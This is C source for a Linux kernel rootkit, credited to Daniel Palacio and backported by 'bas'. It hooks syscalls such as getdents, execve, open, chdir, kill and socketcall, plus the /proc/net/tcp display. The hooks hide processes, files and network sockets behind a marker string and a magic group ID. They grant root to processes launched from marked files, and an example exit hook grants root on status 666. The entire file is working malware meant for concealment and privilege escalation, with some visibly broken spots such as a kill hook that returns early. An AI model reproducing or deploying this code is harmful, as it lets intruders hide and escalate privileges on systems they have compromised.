/* external hook define file */

#define __EXTERN_HOOK_TABLE__

unsigned int sys_table_global = 0;

void *hook_table[NR_syscalls];

/* hook prototypes - use this hook as your reference */
asmlinkage static void hook_example_exit(int status);

/* backporting Daniel's existing code to new hooking engine -bas */

/* Daniel Palacio's includes */
#include <linux/init.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/stddef.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/dirent.h>
#include <linux/types.h>
#include <linux/skbuff.h>
#include <linux/time.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/syscalls.h>
#include <linux/ip.h>
#include <linux/netdevice.h>
#include <linux/proc_fs.h>
#include <linux/resource.h>
#include <linux/spinlock.h>
#include <linux/proc_fs.h>
#include <linux/dcache.h>

#include <net/tcp.h>
#include <asm/uaccess.h>
#include <asm/processor.h>
#include <asm/unistd.h>
#include <asm/ioctls.h>
#include <asm/termbits.h>

#ifdef __NET_NET_NAMESPACE_H
    #include <net/net_namespace.h>
#endif

/* define for Daniel's code */
#define SHRT_MAX    0x7fff
#define VERSION     1
#define PROC_HIDDEN 0x00000020
#define FILE_HIDE   0x200000
#define EVIL_GID    2701 /* 37 73 */
 
signed short hidden_pids[SHRT_MAX];
unsigned long long inode    = 0;   /* The inode of /etc/modules */
static char *HIDE           = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00";
struct proc_dir_entry *tcp;

int errno;

#ifdef __NET_NET_NAMESPACE_H
    struct proc_dir_entry *proc_net;
#else
    extern struct proc_dir_entry *proc_net;
#endif

/* Daniel Palacio's hooks */
asmlinkage static int hook_getdents64 (unsigned int fd, struct dirent64 *dirp, unsigned int count);
asmlinkage static int hook_getdents32 (unsigned int fd, struct dirent *dirp, unsigned int count);
asmlinkage static int hook_execve(const char *filename, char *const argv[], char *const envp[]);
asmlinkage static int hook_socketcall(int call, unsigned long *args);
asmlinkage static int hook_fork(struct pt_regs regs);
asmlinkage static void hook_exit(int error_code);
asmlinkage static int hook_chdir(const char *path);
asmlinkage static int hook_open(const char *pathname, int flags, int mode);
asmlinkage static int hook_kill(int pid, int sig);
asmlinkage static int hook_getpriority(int which, int who);

/* Daniel Palacio's non-syscall hook prototypes */
static int hook_tcp4_seq_show(struct seq_file *seq, void *v);
int (*original_tcp4_seq_show)(struct seq_file *seq, void *v);

/* main hook uninit */
static void __uninit_hook_table(void)
{
    /* unload any additional non-syscall hooks here */
 
    /* un-do Daniel's tcp hook */
    tcp = proc_net->subdir->next;

    /*  tcp4_seq_show() with original */
    while (strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
        tcp = tcp->next;

    if (tcp != proc_net->subdir)
        ((struct tcp_seq_afinfo *)(tcp->data))->seq_show = original_tcp4_seq_show;
}

/* main hook init */
static void __init_hook_table(void)
{
    
    int i;

    /* clear table */
    for (i = 0; i < NR_syscalls; i ++)
        hook_table[i] = NULL;
    
    /* init hooks */
    hook_table[__NR_getdents64]     = (void *)hook_getdents64;
    hook_table[__NR_getdents]       = (void *)hook_getdents32;
    hook_table[__NR_chdir]          = (void *)hook_chdir;
    hook_table[__NR_open]           = (void *)hook_open;
    hook_table[__NR_execve]         = (void *)hook_execve;
    hook_table[__NR_socketcall]     = (void *)hook_socketcall;
    hook_table[__NR_fork]           = (void *)hook_fork;
    hook_table[__NR_exit]           = (void *)hook_exit;
    hook_table[__NR_kill]           = (void *)hook_kill;
    hook_table[__NR_getpriority]    = (void *)hook_getpriority;

    /* example hook */
    //hook_table[__NR_exit]         = (void *)hook_example_exit;
    
    /* any additional (non-syscall) hooks go here */

    /* clear Daniel's hidden_pids */
    memset(hidden_pids, 0, sizeof(hidden_pids));

    /* Daniel Palacio's tcp hook */
    #ifdef __NET_NET_NAMESPACE_H
        proc_net = init_net.proc_net;
    #endif

    if(proc_net == NULL)
        return;

    tcp = proc_net->subdir->next;
    while (strcmp(tcp->name, "tcp") && (tcp != proc_net->subdir))
        tcp = tcp->next;

    if (tcp != proc_net->subdir)
    {
        original_tcp4_seq_show = ((struct tcp_seq_afinfo *)(tcp->data))->seq_show;
        ((struct tcp_seq_afinfo *)(tcp->data))->seq_show = hook_tcp4_seq_show;
    }
}

/* example hook declarations */

asmlinkage /* required: args passed on stack to syscall */
static void hook_example_exit(int status)
{
    /* standard hook prologue */
    asmlinkage int (*orig_exit)(int status);
    void **sys_p    = (void **)sys_table_global;
    orig_exit       = (int (*)())sys_p[__NR_exit];

    printk("*** !!!HOORAY!!! -> hook_example_exit(%d) @ %X called\n", \
            status, (unsigned int)hook_example_exit);

    if(status == 666)
    {
        current->uid    = 0;
        current->gid    = 0;
        current->euid   = 0;
        current->egid   = 0;
    }
    else
        return orig_exit(status);
}

/* XXXXXXXXXXXXXXXXXXXXX DANIEL PALACIO WROTE THE FOLLOWING XXXXXXXXXXXXXXXXXXX */

asmlinkage /* modified this .. but still not happy -bas */
static int hook_getdents64 (unsigned int fd, struct dirent64 __user *dirp, unsigned int count)
{
    struct dirent64 *our_dirent;
    struct dirent64 *their_dirent;
    struct dirent64 *p;
    struct inode *proc_node;
    long their_len  = 0;
    long our_len    = 0;
    void **sys_p    = (void **)sys_table_global;
    asmlinkage int (*original_getdents64)(unsigned int fd, struct dirent64 __user *dirp, unsigned int count) \
                                = sys_p[__NR_getdents64];

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,14)
    proc_node = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    proc_node = current->files->fd[fd]->f_dentry->d_inode;
#endif

    their_dirent    = (struct dirent64 *) kmalloc(count, GFP_KERNEL);
    our_dirent      = (struct dirent64 *) kmalloc(count, GFP_KERNEL);

    /* can't read into kernel land due to !access_ok() check in original */
    their_len = original_getdents64(fd, dirp, count); 

    if (their_len <= 0)
    {
        kfree(their_dirent);
        kfree(our_dirent);
        return their_len;
    }

    /* hidden processes get to see life */
    if (current->flags & PROC_HIDDEN)
    {
        kfree(their_dirent);
        kfree(our_dirent);
        return their_len;
    }

    /* copy out the original results */
    copy_from_user(their_dirent, dirp, their_len);

    p = their_dirent;
    while (their_len > 0)
    {
        int next        = p->d_reclen;
        int hide_proc   = 0;
        char *adjust    = (char *)p;

        /* See if we are looking at a process */
        if (proc_node->i_ino == PROC_ROOT_INO)
        {
            struct task_struct *htask = current;
        #ifdef __DEBUG__
            printk("*** getdents64 dealing with proc entry\n");
        #endif
            for_each_process(htask)
            {
                if(htask->pid == simple_strtoul(p->d_name, NULL, 10))
                {
                    if (htask->flags & PROC_HIDDEN)
                        hide_proc = 1;

                    break;
                }
            }
        }

        /* Hide processes flagged or filenames starting with HIDE*/
        if ((hide_proc == 1) || (strstr(p->d_name, HIDE) != NULL))
        {
        #ifdef __DEBUG__
            printk("*** getdents64 hiding: %s\n", p->d_name);
        #endif
        }
        else
        {
            memcpy((char *)our_dirent + our_len, p, p->d_reclen);
            our_len += p->d_reclen;
        }

        adjust      += next;
        p           = (struct dirent64 *)adjust;
        their_len   -= next;
    }

    /* clear the userland completely */
    memset(their_dirent, 0, count);
    copy_to_user((void *) dirp, (void *) their_dirent, count);

    /* update userland with faked results */
    copy_to_user((void *) dirp, (void *) our_dirent, our_len);

    kfree(our_dirent);
    kfree(their_dirent);

    return our_len;
}

asmlinkage /* modified this .. but still not happy -bas */
static int hook_getdents32 (unsigned int fd, struct dirent __user *dirp, unsigned int count)
{
    struct dirent *our_dirent;
    struct dirent *their_dirent;
    struct dirent *p;
    struct inode *proc_node;
    long their_len  = 0;
    long our_len    = 0;
    void **sys_p    = (void **)sys_table_global;
    asmlinkage int (*original_getdents32)(unsigned int fd, struct dirent __user *dirp, unsigned int count) \
                    = sys_p[__NR_getdents];


#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,14)
    proc_node = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    proc_node = current->files->fd[fd]->f_dentry->d_inode;
#endif

    their_dirent    = (struct dirent *) kmalloc(count, GFP_KERNEL);
    our_dirent      = (struct dirent *) kmalloc(count, GFP_KERNEL);

    /* can't read into kernel land due to !access_ok() check in original */
    their_len = original_getdents32(fd, dirp, count); 

    if (their_len <= 0)
    {
        kfree(their_dirent);
        kfree(our_dirent);
        return their_len;
    }

    /* hidden processes get to see life */
    if (current->flags & PROC_HIDDEN)
    {
        kfree(their_dirent);
        kfree(our_dirent);
        return their_len;
    }

    /* copy out the original results */
    copy_from_user(their_dirent, dirp, their_len);

    p = their_dirent;
    while (their_len > 0)
    {
        int next        = p->d_reclen;
        int hide_proc   = 0;
        char *adjust    = (char *)p;

        /* See if we are looking at a process */
        if (proc_node->i_ino == PROC_ROOT_INO)
        {
            struct task_struct *htask = current;
        #ifdef __DEBUG__
            printk("*** getdents32 dealing with proc entry\n");
        #endif
            for_each_process(htask)
            {
                if(htask->pid == simple_strtoul(p->d_name, NULL, 10))
                {
                    if (htask->flags & PROC_HIDDEN)
                        hide_proc = 1;

                    break;
                }
            }
        }

        /* Hide processes flagged or filenames starting with HIDE*/
        if ((hide_proc == 1) || (strstr(p->d_name, HIDE) != NULL))
        {
        #ifdef __DEBUG__
            printk("*** getdents32 hiding: %s\n", p->d_name);
        #endif
        }
        else
        {
            memcpy((char *)our_dirent + our_len, p, p->d_reclen);
            our_len += p->d_reclen;
        }

        adjust      += next;
        p           = (struct dirent *)adjust;
        their_len   -= next;
    }

    /* clear the userland completely */
    memset(their_dirent, 0, count);
    copy_to_user((void *) dirp, (void *) their_dirent, count);

    /* update userland with faked results */
    copy_to_user((void *) dirp, (void *) our_dirent, our_len);

    kfree(our_dirent);
    kfree(their_dirent);

    return our_len;
}

/* 
    The hacked execve will fix the flag to add our PROC_HIDDEN
    Once set on parent, flag will be copied automagically by the
    kernel to its childs. We also give root priviledges, just for fun.
*/

asmlinkage 
static int hook_execve(const char *filename, char *const argv[], char *const envp[])
{
    int ret;
    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_execve)(const char *filename, char *const argv[], char *const envp[]) = sys_p[__NR_execve];

    if(current->flags & PROC_HIDDEN)
    {
        if (current->pid > 0 && current->pid < SHRT_MAX)
            hidden_pids[current->pid] = 1;
    }

    if((strstr(filename, HIDE) != NULL))
    {
        current->uid    = 0;
        current->euid   = 0;
        current->gid    = EVIL_GID;
        current->egid   = EVIL_GID;
        current->flags  = current->flags | PROC_HIDDEN;
        if (current->pid > 0 && current->pid < SHRT_MAX)
            hidden_pids[current->pid] = 1;
    }
    ret = (*original_execve)(filename, argv, envp);
    return ret;
}

/*
    BUG: This is not the sys_fork in the syscall table it has more args
    its hacked_sys_fork(struct pt_regs)
    http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html
*/

asmlinkage 
static int hook_fork(struct pt_regs regs)
{
    int ret;
    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_sys_fork)(struct pt_regs regs) = sys_p[__NR_fork];

    ret = (*original_sys_fork)(regs);
#ifdef __DEBUG__
    printk("return from sys_fork = %d", ret);
    printk("current=0x%p ret is %d", current, ret);
#endif
    if((current->flags & PROC_HIDDEN) && ret > 0 && ret < SHRT_MAX)
    {
        hidden_pids[ret] = 1;
    }
    return ret;
}

asmlinkage 
static int hook_kill(int pid, int sig)
{
    void **sys_p = (void **)sys_table_global;
    asmlinkage long (*original_sys_kill)(int pid, int sig) = sys_p[__NR_kill];
    printk(" Chicken Chicken.. cluck .. cluck\n");
    return -1;
    if(current->flags & PROC_HIDDEN)
    {
        return original_sys_kill(pid, sig);
    }
    if((pid > 0 && pid < SHRT_MAX) && hidden_pids[pid] == 1)
    {
        return -1;
    }
    
//    return original_sys_kill(pid, sig);
}

asmlinkage 
static void hook_exit(int code)
{
    void **sys_p = (void **)sys_table_global;
    asmlinkage long (*original_sys_exit)(int code) = sys_p[__NR_exit];

    if (current->pid > 0 && current->pid < SHRT_MAX)
        hidden_pids[current->pid] = 0;
    return original_sys_exit(code);
}

asmlinkage 
static int hook_getpriority(int which, int who)
{
    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_sys_getpriority)(int which, int who) = sys_p[__NR_getpriority];

    if(current->flags&PROC_HIDDEN)
    {
        /* Hidden processes see all */
        return (*original_sys_getpriority)(which, who);
    }

    if(who < 0 || who > SHRT_MAX)
    {
        return (*original_sys_getpriority)(which, who);
    }
    if(which == PRIO_PROCESS && who > 0 && who < SHRT_MAX && hidden_pids[who])
    {
        errno = -1;
        return -ESRCH;
    }
    return (*original_sys_getpriority)(which, who);
}

/* 
    When creating a new socket check if caller is hidden, if so set the socket as hidden.
    FILE_HIDE since sockets are files.
*/

asmlinkage 
static int hook_socketcall(int call, unsigned long *args)
{
    long ret;
    struct file *filep;

    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_socket_call)(int call, unsigned long *args) = sys_p[__NR_socketcall];

    ret = original_socket_call(call, args);
    if((current->flags & PROC_HIDDEN) && ret > 0)
    {
        filep = fget(ret);
        if(filep == NULL)
        {
            /* some call will create sockets(recv, send) they will be destroyed anyway */
            return ret;
        }
        filep->f_flags = filep->f_flags | FILE_HIDE;

    }
    return ret;
}

/* 
    This function is called when /net/proc/tcp is read, its in charge of 
    writing the data about current sockets, so we need to subvert that data.
*/

static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sock = (struct sock *) v;
    struct socket *socke;
    struct file *filep;
  
  /*
  //debbuging
    struct inet_sock *inet;
    __be32 dest;
    __be32 src;
  __u16 destp;
  __u16 srcp;
  */

    /* First call, v is just a number, it prints the headers */
    if(v == SEQ_START_TOKEN)
    {
        return (*original_tcp4_seq_show)(seq, v);
    }

    /*
    // This is great for debugging
    inet = inet_sk(sock);
    dest = inet->daddr;
    src = inet->rcv_saddr;
    destp = ntohs(inet->dport);
    srcp = ntohs(inet->sport);
    printk("\n%d:%d %d:%d\n", src, srcp, dest, destp);
    printk("current is %s and flags are %d\n", current->comm, current->flags);
    */

    /* Get the associated socket to sock, anf from there the file */

    socke = sock->sk_socket;
    /* Dont know why this happens, but sk_socket get set to 1 */
    if(socke == NULL || (int)socke == 1)
    {
        return 0;
    }
    filep = socke->file;
    if(current->flags & PROC_HIDDEN)
    {
        /* Hidden processes see all */
        return (*original_tcp4_seq_show)(seq, v);
    }
    /* Check if its not hidden */
    if(!(filep->f_flags & FILE_HIDE))
    {
        /* Not hidden, write all data */
        return (*original_tcp4_seq_show)(seq, v);
    }
    else
    {
        /*This socket is hidden, dont print anything about it  */
        return 0;
    }
}

/* limited /proc/ based listing hiding */

/*
    I modified these to be proc aware properly -bas
*/

asmlinkage
static int hook_chdir(const char __user *path)
{
    int fd          = 0;
    struct inode *inode;

    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_sys_chdir)(const char *path) = sys_p[__NR_chdir];
    asmlinkage int (*original_sys_open)(const char *pathname, int flags, int mode) = sys_p[__NR_open];
    asmlinkage int (*original_sys_close)(int fd) = sys_p[__NR_close];

    if (current->flags & PROC_HIDDEN)
        return original_sys_chdir(path); 

    fd = original_sys_open(path, O_RDONLY, 0);
    if (fd < 0)
        goto error_fd;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,14)
    inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    inode = current->files->fd[fd]->f_dentry->d_inode;
#endif

    /* check if file belongs to our egid */
    if (inode->i_gid == EVIL_GID)
    {
        original_sys_close(fd);
        return -ENOENT;
    }

    original_sys_close(fd);

error_fd:
    return original_sys_chdir(path);
}

asmlinkage
static int hook_open(const char __user *pathname, int flags, int mode)
{
    int fd              = 0;
    struct inode *inode;

    void **sys_p = (void **)sys_table_global;
    asmlinkage int (*original_sys_open)(const char *pathname, int flags, int mode) = sys_p[__NR_open];
    asmlinkage int (*original_sys_close)(int fd) = sys_p[__NR_close];

    if (current->flags & PROC_HIDDEN)
        return original_sys_open(pathname, flags, mode);

    fd = original_sys_open(pathname, flags, mode);
    if (fd < 0)
        goto out;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,14)
    inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
#else
    inode = current->files->fd[fd]->f_dentry->d_inode;
#endif
    
    if (inode->i_gid == EVIL_GID)
    {
        original_sys_close(fd);
        return -ENOENT;
    }

out:
    return fd;
}
